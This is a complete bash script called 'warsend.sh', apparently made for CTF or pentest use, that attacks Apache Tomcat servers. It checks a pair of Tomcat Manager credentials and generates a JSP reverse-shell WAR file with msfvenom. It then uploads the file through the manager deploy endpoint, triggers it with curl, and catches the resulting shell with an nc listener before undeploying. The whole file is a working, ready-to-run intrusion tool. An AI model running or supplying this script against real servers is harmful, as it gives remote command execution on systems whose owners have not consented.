#!/bin/bash

R="\033[0;31m"
G="\033[0;32m"
C="\033[0;36m"
Y="\033[1;33m"
W="\033[0m"

LHOST=$1
LPORT=$2
RHOST=$3
RPORT=$4
USER=$5
PASS=$6
FNAME=$7
PAYLOAD="java/jsp_shell_reverse_tcp"
EXT="war"

if [ -z $LHOST ] ||
	[ -z $LPORT ] ||
	[ -z $RHOST ] ||
	[ -z $RPORT ] ||
	[ -z $USER ] ||
	[ -z $PASS ] ||
	[ -z $FNAME ];
then
	echo "
Usage :

* All Values are Required *
* Input Filename Without File Extension *

./warsend.sh LHOST LPORT RHOST RPORT Username Password Filename

Example : ./warsend.sh 10.10.13.37 1337 10.10.10.184 8080 tomcat tomcat revshell
"
	exit
fi

echo -e $G"
 _       _____    ____  _____                __
| |     / /   |  / __ \/ ___/___  ____  ____/ /
| | /| / / /| | / /_/ /\__ \/ _ \/ __ \/ __  /
| |/ |/ / ___ |/ _, _/___/ /  __/ / / / /_/ /
|__/|__/_/  |_/_/ |_|/____/\___/_/ /_/\__,_/
"$W
echo -e $G"[>]$C Created By :$W thewhiteh4t"
echo -e $G"[>]$C Version    :$W 1.0.0\n"

echo -e $G"[+]$C LHOST                  :"$W $LHOST
echo -e $G"[+]$C LPORT                  :"$W $LPORT
echo -e $G"[+]$C RHOST                  :"$W $RHOST
echo -e $G"[+]$C RPORT                  :"$W $RPORT
echo -e $G"[+]$C Username               :"$W $USER
echo -e $G"[+]$C Password               :"$W $PASS
echo -e $G"[+]$C Reverse Shell Filename :"$W $FNAME
echo -e $G"[+]$C Payload                :"$W $PAYLOAD

echo -e $Y"\n[!] Checking Dependencies..."$W

cmd_fail=false
COMMANDS=(msfvenom curl nc)

for cmd in "${COMMANDS[@]}"
do
	if ! command -v $cmd &> /dev/null
	then
		echo -e $R"[-]$C Package Not Found :"$W $cmd
		cmd_fail=true
	fi
done

if [ $cmd_fail = true ];
then
	exit
fi

echo -e $Y"\n[!] Testing Tomcat Manager Text API Access...\n"$W

SCODE=$(curl -u $USER:$PASS -s -o /dev/null -w "%{http_code}" http://$RHOST:$RPORT/manager/text)

if [ $SCODE == 401 ];
then
	echo -e $R"[-]$C Incorrect Username/Password!"$W
	exit
elif [ $SCODE == 200 ];
then
	echo -e $G"[+]$C Login Successful!\n"$W
else
	echo "[-] Status Code :" $SCODE
	exit
fi

echo -e $G"[+]$C Generating WAR Reverse Shell..."$W
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $EXT > $FNAME.$EXT

echo -e $Y"[!] Uploading WAR File..."$W
curl -u $USER:$PASS --upload-file $FNAME.$EXT http://$RHOST:$RPORT/manager/text/deploy?path=/$FNAME

echo -e $Y"\n[!] Triggering Reverse Shell...\n"$W
sleep 5 && curl http://$RHOST:$RPORT/$FNAME/ &> /dev/null &

echo -e $G"[+]$C Starting Listener..."$W
nc -lvp $LPORT

echo -e $Y"\n[!] Cleaning Up..."$W
curl -u $USER:$PASS http://$RHOST:$RPORT/manager/text/undeploy?path=/$FNAME